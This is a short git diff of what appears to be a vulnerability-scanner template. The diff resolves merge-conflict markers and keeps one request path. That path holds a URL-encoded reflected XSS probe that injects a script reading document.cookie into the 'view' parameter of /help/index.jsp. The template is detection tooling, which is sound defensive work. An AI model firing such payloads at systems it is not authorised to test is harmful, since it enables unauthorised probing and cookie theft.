@@ -10,18 +10,7 @@ info:
 requests:
   - method: GET
     path:
-<<<<<<< HEAD
-<<<<<<< HEAD
-      - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
-=======
       - "{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
->>>>>>> 38b66d3b23c3d36d0bf842267c549749e787cadf
-=======
-      - "{{BaseURL}}/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E"
-=======
-      - "{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>"
->>>>>>> main
->>>>>>> testing
     matchers-condition: and
     matchers:
       - type: status
